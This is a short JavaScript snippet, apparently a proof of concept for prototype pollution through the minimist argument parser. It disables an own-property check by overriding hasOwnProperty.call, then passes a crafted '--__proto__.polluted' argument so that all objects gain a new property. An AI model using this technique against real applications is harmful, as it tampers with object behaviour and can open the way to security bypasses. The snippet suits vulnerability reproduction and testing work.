Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
require('minimist')('--__proto__.polluted yes'.split(' '));
console.log({}.polluted);